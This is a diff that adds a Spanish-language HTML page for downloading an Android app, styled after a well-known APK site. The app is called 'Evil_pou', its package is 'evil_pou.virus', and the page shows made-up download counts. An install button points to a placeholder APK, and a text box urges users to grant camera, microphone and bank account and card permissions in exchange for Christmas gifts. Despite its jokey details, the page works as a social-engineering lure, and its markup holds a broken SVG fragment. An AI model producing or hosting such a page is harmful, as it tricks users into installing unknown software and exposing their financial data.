@@ -1,0 +1,109 @@
+<!doctype html>
+
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Página de descarga - Pou</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root{
+      --bg:#07292b; /* fondo oscuro */
+      --card:#0f3a3b; /* tarjeta */
+      --accent:#2ec4b6; /* color acento */
+      --muted:#9fb7b6;
+      --glass: rgba(255,255,255,0.03);
+      font-family: 'Inter',system-ui,Segoe UI,Roboto,Arial;
+    }
+    html,body{height:100%;margin:0;background:var(--bg);color:#fff}
+    .wrap{max-width:420px;margin:0 auto;padding:18px 14px}/* cabecera estilo uptodown */
+.card{
+  background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.02));
+  border-radius:14px;padding:16px;box-shadow:0 8px 18px rgba(0,0,0,0.4);backdrop-filter: blur(6px);
+}
+
+.top{display:flex;gap:12px;align-items:center}
+.icon{
+  width:82px;height:82px;border-radius:16px;background:linear-gradient(180deg,#f0c27b,#dca95f);display:flex;align-items:center;justify-content:center;flex-shrink:0;border:3px solid rgba(255,255,255,0.04)
+}
+.icon img{width:68px;height:68px;object-fit:contain}
+
+.meta{flex:1}
+.app-title{font-size:20px;font-weight:700;margin:0 0 2px}
+.sub{color:var(--muted);font-size:13px;margin-bottom:8px}
+.author{color:var(--accent);font-weight:600;text-decoration:none}
+
+/* stats */
+.stats{display:flex;gap:12px;margin-top:6px}
+.stat{flex:1;text-align:center;padding:10px 6px;background:var(--glass);border-radius:10px}
+.stat b{display:block;font-size:16px}
+.stat span{display:block;color:var(--muted);font-size:12px}
+
+/* Install button */
+.install-wrap{display:flex;flex-direction:column;gap:10px;margin-top:14px}
+.install{display:block;text-align:center;padding:14px;border-radius:12px;background:var(--accent);color:#042b2a;font-weight:700;text-decoration:none;font-size:16px}
+.secondary{display:block;text-align:center;padding:10px;border-radius:10px;background:transparent;border:1px solid rgba(255,255,255,0.06);color:var(--muted);text-decoration:none;font-size:13px}
+
+/* ad placeholder */
+.ad{margin-top:14px;border-radius:10px;background:#fff;color:#111;padding:12px;text-align:center}
+.ad small{display:block;color:#666}
+
+/* info section */
+.info{margin-top:18px}
+.info h3{margin:0 0 8px;font-size:16px}
+.info .row{display:flex;gap:10px;align-items:center;padding:10px 0;border-top:1px solid rgba(255,255,255,0.02)}
+.label{color:var(--muted);font-size:13px;width:46%}
+.value{flex:1;font-weight:600}
+
+footer{margin-top:18px;text-align:center;color:var(--muted);font-size:13px}
+
+/* responsive small tweaks */
+@media (max-width:360px){.wrap{padding:12px}.icon{width:72px;height:72px}.app-title{font-size:18px}}
+
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="card">
+      <div class="top">
+        <div class="icon" aria-hidden>
+          <!-- icon placeholder: replace with your PNG -->
+          <img src="img/foto1.png" alt="icon"><g><ellipse cx='50' cy='60' rx='40' ry='30' fill='%23dca95f'/><circle cx='38' cy='42' r='6' fill='%23000'/><circle cx='62' cy='42' r='6' fill='%23000'/></g></svg>
+        </div>
+        <div class="meta">
+          <p class="app-title">Evil_pou <span style="font-weight:500;color:var(--muted);font-size:13px">1.4.125</span></p>
+          <a class="author" href="#">IMD</a><div class="stats"> 
+        <div class="stat"><b>4.2</b><span>valoraciones</span></div>
+        <div class="stat"><b>185</b><span>valoraciones</span></div>
+        <div class="stat"><b>16.4 M</b><span>descargas</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="install-wrap">
+    <!-- IMPORTANT: reemplaza el href con la URL real del APK que subirás -->
+    <a class="install" href="apk/evilpou.apk" download>Instalar APK</a>
+    <a class="secondary" href="#info">Más información</a>
+
+    <div class="ad">
+      <small>INFORMACION</small>
+      <div style="padding:10px 6px">Una app que te ara pasar tiempo divertidos y 100% seguro,
+        solo no te olvides darle todos los permisos que te pide como el de la camara, 
+        microfono o cuenta de banco + tarjeta es para que te enviemos regalos por navidad.</div>
+    </div>
+  </div>
+
+  <div class="info" id="info">
+    <h3>Información sobre Pou 1.4.125</h3>
+    <div class="row"><div class="label">Nombre de paquete</div><div class="value">evil_pou.virus</div></div>
+    <div class="row"><div class="label">Tamaño</div><div class="value">100 GB</div></div>
+    <div class="row"><div class="label">Fecha</div><div class="value">0000-00-00</div></div>
+  </div>
+
+</div>
+
+<footer>Diseñado para teléfono • 100% móvil</footer>
+
+  </div>
+</body>
+</html>
